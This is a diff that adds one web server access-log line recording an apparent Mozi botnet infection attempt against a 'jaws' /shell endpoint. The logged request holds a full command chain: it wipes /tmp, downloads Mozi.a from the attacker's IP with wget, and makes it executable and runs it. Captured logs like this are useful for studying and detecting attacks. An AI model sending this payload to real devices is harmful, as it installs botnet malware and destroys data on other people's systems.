@@ -1,0 +1,1 @@
+175.181.103.177 - - [29/Feb/2020:19:17:53 +0200] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://175.181.103.177:48474/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
